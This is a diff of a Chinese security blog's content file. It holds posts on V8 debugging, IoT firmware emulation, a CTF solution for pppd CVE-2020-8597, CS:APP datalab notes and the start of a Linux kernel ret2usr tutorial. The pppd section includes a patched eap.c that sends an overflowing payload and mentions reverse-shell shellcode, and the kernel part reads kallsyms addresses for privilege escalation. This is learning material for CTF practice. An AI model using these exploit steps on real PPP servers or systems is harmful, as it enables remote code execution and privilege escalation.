-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~&#x2F;v8&#x2F;v8&#x2F;out.gn&#x2F;x64.debug&#x2F;</span><br><span class="line">将test.js放到该目录下</span><br><span class="line">gdb .&#x2F;d8</span><br><span class="line">gdb-peda$ set args --allow-natives-syntax .&#x2F;test.js</span><br><span class="line">gdb-peda$ r</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: &#x2F;home&#x2F;winter&#x2F;v8&#x2F;v8&#x2F;out.gn&#x2F;x64.debug&#x2F;d8 --allow-natives-syntax .&#x2F;test.js</span><br><span class="line">[...]</span><br><span class="line">DebugPrint: 0x3847d864df19: [JSArray]</span><br><span class="line"> - map: 0x27aca0f42d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x33ab2b711111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3847d864de39 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x27d6f1300c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x1f78960401a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3847d864de39 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x3847d864df19(这个地址根据第九行那里显示地址)</span><br><span class="line">0x3847d864df19: [JSArray]</span><br><span class="line"> - map: 0x27aca0f42d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x33ab2b711111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3847d864de39 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x27d6f1300c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x1f78960401a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3847d864de39 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
-
-<p>v8的gdb也可以了</p>
-<h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tools&#x2F;dev&#x2F;gm.py x64.debug d8</span><br></pre></td></tr></table></figure>]]></content>
-      <tags>
-        <tag>v8</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>固件iot基础</title>
-    <url>/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/</url>
-    <content><![CDATA[<p>IOT 安全实战资料收集整合：<a href="https://zybuluo.com/H4l0/note/1524758" target="_blank" rel="noopener">https://zybuluo.com/H4l0/note/1524758</a></p>
-<h3 id="一、固件安全概述"><a href="#一、固件安全概述" class="headerlink" title="一、固件安全概述"></a>一、固件安全概述</h3><p>​    固件指设备内部保存的<strong>设备 “驱动程序”</strong>，通过固件，操作系统才能按照标准的设备驱动实现特定机器的运行动作。固件是担任着一个系统最基础最底层工作的软件。</p>
-<p>​    在硬件设备中，固件就是硬件设备的灵魂，因为一些硬件设备除了固件以外没有其它软件组成，因此固件也就决定着硬件设备的功能及性能。</p>
-<h4 id="固件结构特点"><a href="#固件结构特点" class="headerlink" title="固件结构特点"></a>固件结构特点</h4><p>iot 设备固件一般由 bootloader、kernel、rootfs 几部分组成。</p>
-<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200829170912807.png" alt="image-20200829170912807"></p>
-<h3 id="二、固件模拟概述"><a href="#二、固件模拟概述" class="headerlink" title="二、固件模拟概述"></a>二、固件模拟概述</h3><p>iot 设备固件属于嵌入式固件的一种，无法直接运行在 x86 架构上。<br>需要借助一些模拟器来进行模拟，一般选择 qemu 模拟器。</p>
-<h4 id="vmware-和-qemu-的区别"><a href="#vmware-和-qemu-的区别" class="headerlink" title="vmware 和 qemu 的区别"></a>vmware 和 qemu 的区别</h4><p>vmware 和 qemu都是虚拟机软件，他们的区别如下：</p>
-<ul>
-<li>vmware 目前只能模拟 x86 和 x64 架构，也就是是或不能模拟其他指令集，所以通常用来运行 ubuntu 系统，安装开发环境来进行交叉编译开发ARM软件。</li>
-<li>qemu 则能够在PC系统中模拟其他指令集的处理器，比如直接模拟Arm架构的处理器，当然也可以模拟 x86 和 x64 架构。</li>
-</ul>
-<p>使用：</p>
-<ul>
-<li>通常在PC平台安装 vmware 虚拟机软件，运行 ubuntu，编写和编译arm架构软件，然后在目标开发板运行。</li>
-<li>qemu 可以认为是在没有Arm开发板的情况下来模拟一个Arm开发板，运行 ubuntu 中开发的软件进行验证。</li>
-</ul>
-<h4 id="qemu-固件模拟"><a href="#qemu-固件模拟" class="headerlink" title="qemu 固件模拟"></a>qemu 固件模拟</h4><p>有两种运行方式：</p>
-<ul>
-<li>用户模式（user mode）：qemu 可以在当前CPU上执行被编译为支持其他CPU的程序（例如：qemu 可以在 x86 机器上执行一个ARM二进制可执行程序）。</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~$ qemu-arm -L .&#x2F; .&#x2F;.&#x2F;usr&#x2F;bin&#x2F;tddp</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200829174231769.png" alt="image-20200829174231769"></p>
-<ul>
-<li>系统模式（system mode）：qemu 能模拟整个电脑系统，包括中央处理器及其他周边设备。</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~&#x2F;squashfs-root# chroot . sh</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200829174236510.png" alt="image-20200829174236510"></p>
-<h3 id="三、MISP-PWN-amp-ARM-PWN"><a href="#三、MISP-PWN-amp-ARM-PWN" class="headerlink" title="三、MISP PWN &amp; ARM PWN"></a>三、MISP PWN &amp; ARM PWN</h3><h4 id="1）ctf-中的-mips-pwn"><a href="#1）ctf-中的-mips-pwn" class="headerlink" title="1）ctf 中的 mips pwn"></a>1）ctf 中的 mips pwn</h4><h5 id="（a）2020-De1ctf-pppd-（CVE-2020-8597）"><a href="#（a）2020-De1ctf-pppd-（CVE-2020-8597）" class="headerlink" title="（a）2020 De1ctf - pppd （CVE-2020-8597）"></a>（a）2020 De1ctf - pppd （CVE-2020-8597）</h5><p>考点：</p>
-<ol>
-<li>nday cve 漏洞分析和利用；</li>
-<li>mips 指令集栈溢出漏洞的调试和利用</li>
-</ol>
-<p>文件：<code>vmlinux</code>、<code>rootfs.img</code>、<code>qemu</code>的启动脚本<code>start.sh</code>。</p>
-<p>漏洞点：</p>
-<p>在 <a href="https://github.com/paulusmack/ppp/blob/ppp-2.4.7/pppd/eap.c#0" target="_blank" rel="noopener">eap_request</a>和<a href="https://github.com/paulusmack/ppp/blob/ppp-2.4.7/pppd/eap.c#L1719" target="_blank" rel="noopener">eap_response</a>函数中，<code>rhostname</code>是在栈中分配的256字节长的缓冲区。在<code>EAPT_MD5CHAP</code>分支中，由于<a href="https://github.com/paulusmack/ppp/commit/8d7970b8f3db727fe798b65f3377fe6787575426" target="_blank" rel="noopener">不正确的大小检查</a>，主机名大于256个字节长将被允许被复制到<code>rhostname</code>，从而导致堆栈溢出。</p>
-<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200830121124694.png" alt="image-20200830121124694"></p>
-<p>操作步骤：</p>
-<p>（1）用<code>cpio</code>解包<code>rootfs.img</code> 。</p>
-<p>在chall目录下创建rootfs文件夹：<code>mkdir rootfs</code></p>
-<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200830121439048.png" alt="image-20200830121439048"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd rootfs</span><br><span class="line">$ cpio -idvm &lt; ..&#x2F;rootfs.img</span><br></pre></td></tr></table></figure>
-
-<p>（2）编辑<code>etc/inittab</code></p>
-<p>找到对应相同的注释，把下面的覆盖过去即可。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Put a getty on the serial port</span><br><span class="line">#ttyS0::respawn:&#x2F;sbin&#x2F;getty -L  ttyS0 0 vt100 # GENERIC_SERIAL</span><br><span class="line">#ttyS0::sysinit:&#x2F;pppd auth local lock defaultroute nodetach 172.16.1.1:172.16.1.2 ms-dns 8.8.8.8 require-eap lcp-max-configure 100</span><br><span class="line"># Bring up network device</span><br><span class="line">::sysinit:&#x2F;sbin&#x2F;ifup -a</span><br><span class="line"># Launch gdbserver</span><br><span class="line">ttyS0::sysinit:&#x2F;gdbserver :1234 &#x2F;pppd &#x2F;dev&#x2F;ttyS1 auth local lock defaultroute nodetach 172.16.1.1:172.16.1.2 ms-dns 8.8.8.8 require-eap lcp-max-configure 100</span><br><span class="line"></span><br><span class="line"># Stuff to do for the 3-finger salute</span><br></pre></td></tr></table></figure>
-
-<p>（3）修改<code>start.sh</code>文件</p>
-<p>将最后面<code>-net null...</code>选项修改为<code>-net user,hostfwd=tcp::1234-:1234 -net nic -serial stdio -serial pty</code></p>
-<p>（4）将gdbserver放到环境的根目录<code>rootfs/</code>下</p>
-<p>（5）重新打包<code>rootfs.img</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd rootfs</span><br><span class="line">$ find . | cpio -H newc -o &gt; ..&#x2F;rootfs.img</span><br></pre></td></tr></table></figure>
-
-<p>（6）运行</p>
-<p><code>./start.sh</code></p>
-<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200830122145171.png" alt="image-20200830122145171"></p>
-<p>打开一个新的窗口，使用<code>gdb</code>启动并连接远程<code>pppd</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;hws_zongjie&#x2F;pppd&#x2F;attachment&#x2F;docker&#x2F;chall$ gdb-multiarch -ex &#39;set architecture mips&#39;   \</span><br><span class="line">               -ex &#39;target remote :1234&#39;     \</span><br><span class="line">               -ex &#39;file rootfs&#x2F;pppd&#39;        \</span><br><span class="line">               -ex &#39;break *0x42F9A8&#39;         \</span><br><span class="line">               -ex &#39;continue&#39;</span><br></pre></td></tr></table></figure>
-
-<p>再打开一个新的窗口</p>
-<p>编写一个1024字节长的循环字符串<code>/tmp/sc</code>作为payload：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python -c &#39;from pwn import*; open(&quot;&#x2F;tmp&#x2F;sc&quot;, &quot;wb&quot;).write(cyclic(1024))&#39;</span><br><span class="line">$ cat &#x2F;tmp&#x2F;sc</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak</span><br></pre></td></tr></table></figure>
-
-<p>接着</p>
-<p>（1）下载ppp的源码</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;paulusmack&#x2F;ppp.git</span><br><span class="line">cd ppp</span><br><span class="line">cd pppd</span><br></pre></td></tr></table></figure>
-
-<p>（2）修改<code>eap.c</code>，搜索<code>eap_chap_response</code>，找到</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eap_chap_response(esp, id, hash, esp-&gt;es_client.ea_name,</span><br><span class="line">		    esp-&gt;es_client.ea_namelen);</span><br></pre></td></tr></table></figure>
-
-<p>修改为</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">char payload[1024] &#x3D; &#123;0&#125;;</span><br><span class="line">FILE *fp &#x3D; fopen(&quot;&#x2F;tmp&#x2F;sc&quot;, &quot;r&quot;);</span><br><span class="line">fread(payload, 1, 1024, fp);</span><br><span class="line">fclose(fp);</span><br><span class="line">eap_chap_response(esp, id, hash, payload, 1024);</span><br></pre></td></tr></table></figure>
-
-<p>（3）编译</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ..</span><br><span class="line">pppd$ make </span><br><span class="line">$ cd pppd</span><br><span class="line">$ cp pppd pppd-payload</span><br></pre></td></tr></table></figure>
-
-<p>（4）在本地机器运行patched <code>pppd</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo .&#x2F;pppd-payload noauth local defaultroute debug nodetach &#x2F;dev&#x2F;pts&#x2F;1 user admin password 1234568</span><br></pre></td></tr></table></figure>
-
-<p>不久，远程<code>pppd</code>崩溃并出现分段错误。</p>
-<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200830154226602.png" alt="image-20200830154226602"></p>
-<p>获取flag：</p>
-<p>方法一：</p>
-<p>执行<code>./exp.sh</code>，wireshark单独捕捉流量，然后直接搜flag</p>
-<p>方法二：</p>
-<p>msf生成 shellcode，然后用gen_payload.py脚本去生成payload就行了</p>
-<p>不过由于这是本地模拟，方法一可能抓不到，方法二反弹shellcode好像也有点问题，但是会回连端口。</p>
-<p>参考：</p>
-<p><a href="https://www.anquanke.com/post/id/200639" target="_blank" rel="noopener">https://www.anquanke.com/post/id/200639</a></p>
-<p><a href="https://github.com/xf1les/ctf-writeups/tree/master/De1taCTF_2020/pppd" target="_blank" rel="noopener">https://github.com/xf1les/ctf-writeups/tree/master/De1taCTF_2020/pppd</a></p>
-<p><a href="https://github.com/De1ta-team/De1CTF2020/blob/master/writeup/pwn/pppd/README_zh.md" target="_blank" rel="noopener">https://github.com/De1ta-team/De1CTF2020/blob/master/writeup/pwn/pppd/README_zh.md</a></p>
-<h5 id="（b）2019-0ctf-embeded-heap"><a href="#（b）2019-0ctf-embeded-heap" class="headerlink" title="（b）2019 0ctf - embeded_heap"></a>（b）2019 0ctf - embeded_heap</h5><p>参考：</p>
-<p><a href="https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/" target="_blank" rel="noopener">https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/</a></p>
+<p><img src="/2020/10/22/embedded/image-20200831191612015.png" alt="image-20200831191612015"></p>
+<p>qemu-mips  -L ./ ./embedded_heap</p>
+<p>也可以直接<code>./embedded_heap</code></p>
+<p>【可以使用的原因可能是因为binutils的存在用编译器自动转换了】</p>
+<p><strong>注意</strong></p>
+<p>还要修改lib文件下链接文件的权限</p>
+<p><img src="/2020/10/22/embedded/image-20200831191636914.png" alt="image-20200831191636914"></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/" target="_blank" rel="noopener">https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/</a></p>
 <p><a href="https://zybuluo.com/H4l0/note/1633971" target="_blank" rel="noopener">https://zybuluo.com/H4l0/note/1633971</a></p>
-<p>考点：</p>
-<ol>
-<li>mips 堆溢出利用；</li>
-<li>uClibc 堆管理机制。 </li>
-</ol>
-<h4 id="2）ctf-中的-arm-pwn"><a href="#2）ctf-中的-arm-pwn" class="headerlink" title="2）ctf 中的 arm pwn"></a>2）ctf 中的 arm pwn</h4><h3 id="四、固件中常见安全漏洞"><a href="#四、固件中常见安全漏洞" class="headerlink" title="四、固件中常见安全漏洞"></a>四、固件中常见安全漏洞</h3><h4 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h4><p>栈溢出是在IOT设备固件中非常常见的一类的漏洞，当溢出的长度足以控制栈上的返回地址时，很容易造成任意代码执行的风险。</p>
-<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200830015127901.png" alt="image-20200830015127901"></p>
-<p>DLINK DIR-815 路由器前台栈溢出</p>
-<h4 id="命令执行-命令注入"><a href="#命令执行-命令注入" class="headerlink" title="命令执行 / 命令注入"></a>命令执行 / 命令注入</h4><p>命令注入在IOT设备固件同样非常普遍，且利用简单，注入点通常运行的服务都是root权限。</p>
-<ul>
-<li>DLINK DIR-859 upnp 协议命令注入</li>
-<li>tplink sr20 路由器命令注入</li>
-<li>Draytek Vigor2960 前台登录处栈溢出</li>
-</ul>
-<p>TPLINK Sr20 路由器 tddp 协议命令注入漏洞</p>
-<h4 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a>拒绝服务</h4><p>在 IOT 设备固件中，拒绝服务漏洞通常是由于程序自身代码逻辑的缺陷导致的一类漏洞，这类漏洞一般都是由于内存操作方面的操作不当，造成空指针异常或者非法地址引用等问题进而导致设备服务崩溃或者设备重启。</p>
-<h3 id="五、实战"><a href="#五、实战" class="headerlink" title="五、实战"></a>五、实战</h3><p>栈溢出</p>
-<p>TPLINK WR841n 路由器后台栈溢出</p>
-<p>漏洞成因：httpd 服务中 stringModify 函数没有对转移义后的字符串长度进行有效判断，导致最后的字符串复制到目标栈内存空间中，其长度超过当前栈空间的大小，发生栈溢出。</p>
-<p>命令注入</p>
-<p>TPLINK Sr20 路由器 tddp 协议命令注入漏洞</p>
-<p>漏洞成因：tddp 协议服务对用户的输入没有进行有效的过滤，导致用户可以构造恶意的数据包造成命令注入。</p>
 <hr>
-<h3 id="cpio的解包与打包："><a href="#cpio的解包与打包：" class="headerlink" title="cpio的解包与打包："></a>cpio的解包与打包：</h3><p>cpio -idvm &lt; <strong>../rootfs.img</strong><br>find . | cpio -H newc -o &gt; <strong>../initrd.cpio</strong></p>
-<h3 id="squashfs解包与打包："><a href="#squashfs解包与打包：" class="headerlink" title="squashfs解包与打包："></a>squashfs解包与打包：</h3><p>unsquashfs  openwrt.squashfs<br>mksquashfs squashfs-root-0 1.squashfs -comp xz</p>
-<h3 id="ext4"><a href="#ext4" class="headerlink" title="ext4"></a>ext4</h3><p>这种文件系统的打包与解包使用mount挂载</p>
-<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200829204006754.png" alt="image-20200829204006754"></p>
-<p>可以把cpio,squashfs,ext4理解成一个压缩包，都可以用<strong>binwalk解包</strong>，但是打包的方式是不同的</p>
-<p>这些东西其实就是文件系统，不仅仅保存文件内容，还保存这文件的元数据（名字，修改时间，作者啥啥的）</p>
+<h3 id="交叉编译环境"><a href="#交叉编译环境" class="headerlink" title="交叉编译环境"></a>交叉编译环境</h3><p><a href="https://baike.baidu.com/item/交叉编译/10916911" target="_blank" rel="noopener">交叉编译</a>（cross-compilation）是指，在某个主机平台上（比如PC上）用<a href="https://baike.baidu.com/item/交叉编译器/5125452" target="_blank" rel="noopener">交叉编译器</a>编译出可在其他平台上（比如ARM上）运行的代码的过程。</p>
 ]]></content>
+      <categories>
+        <category>mips pwn</category>
+      </categories>
       <tags>
         <tag>iot</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>datalab</title>
+    <url>/2020/07/23/datalab/</url>
+    <content><![CDATA[<h4 id="1-bitXor"><a href="#1-bitXor" class="headerlink" title="1.bitXor"></a>1.bitXor</h4><p>用～（取补）和&amp;实现异或操作</p>
+<p><img src="/2020/07/23/datalab/image-20200720182358141.png" alt="image-20200720182358141"></p>
+<h4 id="2-tmin"><a href="#2-tmin" class="headerlink" title="2.tmin"></a>2.tmin</h4><p>两字节补码的最小数</p>
+<p>0111 1111 1111 1111 1111 1111 1111 1111 最大的，～x + 1，取负，负数比正数小一个</p>
+<p>1000 0000 0000 0000 0000 0000 0000 0000 == 0x80000000 </p>
+<p>太大了，用移位</p>
+<h4 id="3-isTmax"><a href="#3-isTmax" class="headerlink" title="3.isTmax"></a>3.isTmax</h4><p>如果x是最大值，返回1，否则返回0</p>
+<ul>
+<li>最大值，符号位是0，其他是1，所以+1后，符号位是1，其他是0，相异或，全1,全1的反是0，0取非是1（判断是否是-1的方法）</li>
+<li>除了最大值，-1也有同样的情况</li>
+</ul>
+<p>排除：+1后，最大值是变成另一个数，而-1是0，根据这个排除掉-1</p>
+<h4 id="4-allOddBits"><a href="#4-allOddBits" class="headerlink" title="4.allOddBits"></a>4.allOddBits</h4><p>如果奇数位都是1，返回1，否则，返回0</p>
+<p>让x与0xAAAAAAAA相与，如果奇数位都是1，结果是0xAAAAAAAA，再异或就是0了，否则就非0</p>
+<h4 id="5-negate"><a href="#5-negate" class="headerlink" title="5.negate"></a>5.negate</h4><p>实现取反</p>
+<p>-x = ~x + 1</p>
+<h4 id="6-isAsciiDigit"><a href="#6-isAsciiDigit" class="headerlink" title="6.isAsciiDigit"></a>6.isAsciiDigit</h4><p>如果 0x30 &lt;= x &lt;= 0x39 ，返回1，否则，返回0</p>
+<p>将x与两数相减（x - y ==  x + （～y + 1） ），判断符号位（通过右移），第一个为正，第二个为负</p>
+<h4 id="7-conditional"><a href="#7-conditional" class="headerlink" title="7.conditional"></a>7.conditional</h4><p>有三个参数，x、y、z，如果x非0，返回y，否则，返回z</p>
+<p>判断x是否非零：!!x</p>
+<p>返回一个数：变成1，然后～x + 1变成-1（全1），然后相与</p>
+<h4 id="8-isLessOrEqual"><a href="#8-isLessOrEqual" class="headerlink" title="8.isLessOrEqual"></a>8.isLessOrEqual</h4><p>三种情况</p>
+<ul>
+<li>符号相反，如果y为正数，为1</li>
+<li>符号相同，相减 &gt; 0为1</li>
+<li>两数相等（异或实现），返回1</li>
+</ul>
+<h4 id="9-logicalNeg"><a href="#9-logicalNeg" class="headerlink" title="9.logicalNeg"></a>9.logicalNeg</h4><p>实现取非运算，零返回1，其他返回0</p>
+<p>正负零的符号位都是0</p>
+<p>取反与1&amp;，正负再&amp;</p>
+<h4 id="10-howManyBits"><a href="#10-howManyBits" class="headerlink" title="10.howManyBits"></a>10.howManyBits</h4><p>求共有多少位，最高位+1</p>
+<p>特殊情况</p>
+<ul>
+<li>0 : 1</li>
+<li>1 : 1</li>
+</ul>
+<p>正数：最高位1的位置 + 1（符号位）</p>
+<p>负数：求反码，同正数</p>
+<p>具体采用二分，32分成16，看高位16是否为0，非0，说明至少有16 + 1（前面的数）+ 1 （符号位），接着再8、4、2、1下去</p>
+<h4 id="11-floatScale2"><a href="#11-floatScale2" class="headerlink" title="11.floatScale2"></a>11.floatScale2</h4><p>实现乘2功能。（内部使用的单精度浮点型）</p>
+<p>特殊情况</p>
+<ul>
+<li>NaN：直接将参数返回回去</li>
+<li>区别规格化数和非规格化数</li>
+</ul>
+<p>单精度浮点内部</p>
+<p><img src="/2020/07/23/datalab/image-20200720214424119.png" alt="image-20200720214424119"></p>
+<p>NaN</p>
+<p><img src="/2020/07/23/datalab/image-20200720214532080.png" alt="image-20200720214532080"></p>
+<p>正负无穷</p>
+<p><img src="/2020/07/23/datalab/D:%5Cwinter-blog%5Csource_posts%5Cdatalab%5C11.png" alt="11"></p>
+<h4 id="12-floatFloat2Int"><a href="#12-floatFloat2Int" class="headerlink" title="12.floatFloat2Int"></a>12.floatFloat2Int</h4><p>参数的类型是unsigned，是浮点数的机器数，将其转换为该浮点数转换的int值。</p>
+<p>情况：</p>
+<ul>
+<li><p>指数部分为为负，说明一定是零点几，直接返0</p>
+</li>
+<li><p>如果大于31，大了，直接返回0x80000000u</p>
+</li>
+<li><p>在里面，先让尾数部分加上默认的1，然后看指数是否能把所有的尾数变整</p>
+<ul>
+<li>E &lt; 23，说明后面还有小数部分</li>
+<li>E &gt; 23，说明尾数都完整整数，还可以继续乘2^(E-23)</li>
+</ul>
+<p>最后，根据符号位，返回对应符号的frac</p>
+</li>
+</ul>
+<h4 id="13-floatPower2"><a href="#13-floatPower2" class="headerlink" title="13.floatPower2"></a>13.floatPower2</h4><p>2^x（x是参数），求该值float的机器数</p>
+<p>分别判断0和无穷大的情况，然后将阶码左移23位即可。</p>
+<p>23是因为，阶码部分，就是尾数（23位）前面，有个默认的1</p>
+<p>E = x;</p>
+<p>0 | bios + E | 23个0</p>
+<p><img src="/2020/07/23/datalab/D:%5Cwinter-blog%5Csource_posts%5Cdatalab%5C13.1.png" alt="13.1"></p>
+<p><img src="/2020/07/23/datalab/D:%5Cwinter-blog%5Csource_posts%5Cdatalab%5C13.2.png" alt="13.2"></p>
+<hr>
+<p><img src="/2020/07/23/datalab/image-20200720222037585.png" alt="image-20200720222037585"></p>
+]]></content>
+      <tags>
+        <tag>csapp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>winter</title>
+    <url>/2020/07/23/winter/</url>
+    <content><![CDATA[<p>who am i</p>
+<p>hexo主题：<a href="https://hexo.io/themes/" target="_blank" rel="noopener">https://hexo.io/themes/</a></p>
+]]></content>
   </entry>
   <entry>
     <title>chrome study by v8 oob</title>
@@ -913,10 +614,309 @@ $ grep commit_creds  /proc/kallsyms </code></pre><p><img src="/2020/10/22/ret2us
       </tags>
   </entry>
   <entry>
-    <title>winter</title>
-    <url>/2020/07/23/winter/</url>
-    <content><![CDATA[<p>who am i</p>
-<p>hexo主题：<a href="https://hexo.io/themes/" target="_blank" rel="noopener">https://hexo.io/themes/</a></p>
+    <title>ret2usr</title>
+    <url>/2020/10/22/ret2usr/</url>
+    <content><![CDATA[<p>适合人群：内核基础为0</p>
+<h2 id="知识学习"><a href="#知识学习" class="headerlink" title="知识学习"></a>知识学习</h2><p>基础知识：</p>
+<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge-zh/</a></p>
+<p><a href="https://xz.aliyun.com/t/7625#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/7625#toc-10</a></p>
+<h4 id="copy-from-user"><a href="#copy-from-user" class="headerlink" title="copy_from_user"></a>copy_from_user</h4><p>copy_from_user(void *to, const void __user *from, unsigned long n)</p>
+<p>（1）to：将数据拷贝到<strong>内核地址</strong> </p>
+<p>（2）from：需要拷贝数据的<strong>用户地址</strong></p>
+<p>（3）n：拷贝数据的长度（字节）</p>
+<blockquote>
+<p>也就是将form用户地址中的数据拷贝到to内核地址中去，拷贝长度是n</p>
+</blockquote>
+<h4 id="cpio解压和打包"><a href="#cpio解压和打包" class="headerlink" title="cpio解压和打包"></a>cpio解压和打包</h4><p>解压：cpio -idvm &lt; ../initramfs.cpio<br>打包：find . | cpio -H newc -o &gt; ../initramfs.cpio</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>调试，<code>startvm.sh</code>末尾加上</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-gdb tcp::1234 -S</span><br></pre></td></tr></table></figure>
+
+<p>【注：上一行后面还要加上’ \ ‘，不然的话，远程调试可能端口没开，连不上】</p>
+<p><img src="/2020/10/22/ret2usr/image-20200903111140398.png" alt="image-20200903111140398"></p>
+<h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><h4 id="ret2usr（level1）"><a href="#ret2usr（level1）" class="headerlink" title="ret2usr（level1）"></a>ret2usr（level1）</h4><p>说明：参考<code>Linux Kernel Pwn 初探</code>,主要加上具体的一些细节</p>
+<h5 id="查找prepare-kernel-cred和commit-creds的地址"><a href="#查找prepare-kernel-cred和commit-creds的地址" class="headerlink" title="查找prepare_kernel_cred和commit_creds的地址"></a>查找prepare_kernel_cred和commit_creds的地址</h5><pre><code>$ grep prepare_kernel_cred  /proc/kallsyms 
+$ grep commit_creds  /proc/kallsyms </code></pre><p><img src="/2020/10/22/ret2usr/image-20200903105056015.png" alt="image-20200903105056015"></p>
+<p>但是直接执行，地址都是0x0，需要root权限。</p>
+<p><img src="/2020/10/22/ret2usr/image-20200903105223481.png" alt="image-20200903105223481"></p>
+<p>方法：修改suid</p>
+<p>（1）创建一个文件夹</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mkdir myimage</span><br><span class="line">$ cd myimage</span><br></pre></td></tr></table></figure>
+
